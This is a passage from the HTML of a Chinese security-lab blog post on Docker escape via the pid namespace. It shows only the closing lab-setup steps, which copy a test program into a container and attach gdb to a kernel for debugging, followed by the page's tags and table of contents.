fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p>将test程序拷贝到Docker中</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">Docker cp /home/bling/exp/test e48:/app</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
</ul>
<p>调试机中：</p>
<ul>
<li>
<p>gdb加载内核elf符号文件</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">$ gdb</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">(gdb) target remote 192.168.133.1:8864</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">(gdb) file ./vmlinuz-5.15.0-105-generic.elf</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">(gdb) add-symbol-file ./hello.ko 0xffffffffc071e000</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">(gdb) b *0xffffffffc071e01d</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">(gdb) c</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
</ul></div><footer class="docusaurus-mt-lg"><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="https://tiangonglab.github.io/blog/tags/docker">Docker</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="https://tiangonglab.github.io/blog/tags/namespace">namespace</a></li></ul></div></div><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class="col"><a href="https://github.com/TianGongLab/poc_docs/tree/main/blog/2024-05-15-docker-pid-namespace/index.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="博文分页导航"><a class="pagination-nav__link pagination-nav__link--next" href="https://tiangonglab.github.io/blog/tiangongarticle029"><div class="pagination-nav__sublabel">较旧一篇</div><div class="pagination-nav__label">关于 C++ 迭代器失效特性的研究</div></a></nav><div style="margin-top: 20px;"><script src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/client.js" data-repo="TianGongLab/TianGongLab.github.io" data-repo-id="R_kgDOKnzvGw" data-category="Announcements" data-category-id="DIC_kwDOKnzvG84Cbaxt" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async=""></script><div class="giscus"><iframe class="giscus-frame" title="Comments" scrolling="no" allow="clipboard-write" src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/widget.html" style="height: 372px;"></iframe></div></div></main><div class="col col--2"><div class="tableOfContents_bqdL thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#%E4%B8%80%E8%83%8C%E6%99%AF" class="table-of-contents__link toc-highlight table-of-contents__link--active">一、背景</a></li><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#%E4%BA%8Cdocker%E9%80%83%E9%80%B8%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%86%E7%B1%BB" class="table-of-contents__link toc-highlight">二、Docker逃逸历史漏洞及分类</a></li><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#%E4%B8%89docker%E4%BE%9D%E8%B5%96%E7%9A%84%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6" class="table-of-contents__link toc-highlight">三、Docker依赖的内核安全机制</a><ul><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#31-%E6%9F%A5%E7%9C%8B%E7%8A%B6%E6%80%81" class="table-of-contents__link toc-highlight">3.1 查看状态</a></li><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#32-%E8%BF%9B%E7%A8%8B%E8%A7%92%E5%BA%A6" class="table-of-contents__link toc-highlight">3.2 进程角度</a></li></ul></li><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#%E5%9B%9B%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%91%E5%B1%95%E5%8E%86%E5%8F%B2" class="table-of-contents__link toc-highlight">四、利用方法发展历史</a><ul><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#41-%E6%94%B9%E8%BF%9B%E7%A8%8Bfs_struct" class="table-of-contents__link toc-highlight">4.1 改进程fs_struct</a></li><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#42-%E6%94%B9capns-v10" class="table-of-contents__link toc-highlight">4.2 改cap+ns v1.0</a></li><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#43-%E6%94%B9capns-v20" class="table-of-contents__link toc-highlight">4.3 改cap+ns v2.0</a></li><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#44-%E8%A2%AB%E5%BF%BD%E7%95%A5%E7%9A%84-pid-namespace" class="table-of-contents__link toc-highlight">4.4 被忽略的 pid namespace</a></li><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#45-%E8%BE%83%E5%B0%91%E8%A2%AB%E6%8F%90%E5%8F%8A%E7%9A%84-seccomp" class="table-of-contents__link toc-highlight">4.5 较少被提及的 seccomp</a></li></ul></li><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#%E4%BA%94%E6%80%BB%E7%BB%93" class="table-of-contents__link toc-highlight">五、总结</a></li><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#%E5%85%AD%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0" class="table-of-contents__link toc-highlight">六、参考文章</a></li><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#%E4%B8%83%E9%99%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA" class="table-of-contents__link toc-highlight">七、附：环境搭建</a><ul><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#71-%E8%AE%BE%E7%BD%AE%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83" class="table-of-contents__link toc-highlight">7.1 设置调试环境</a></li><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#72-%E5%88%9B%E5%BB%BAdocker" class="table-of-contents__link toc-highlight">7.2 创建Docker</a></li><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#73-%E7%BC%96%E8%AF%91%E6%B5%8B%E8%AF%95ko" class="table-of-contents__link toc-highlight">7.3 编译测试ko</a></li><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#74-%E6%B5%8B%E8%AF%95%E7%A8%8B%E5%BA%8F" class="table-of-contents__link toc-highlight">7.4 测试程序</a></li><li><a href="https://tiangonglab.github.io/blog/tiangongarticle030#75-%E8%B0%83%E8%AF%95" class="table-of-contents__link toc-highlight">7.5 调试</a></li></ul></li></ul></div></div></div></div></div></div>

</body></html>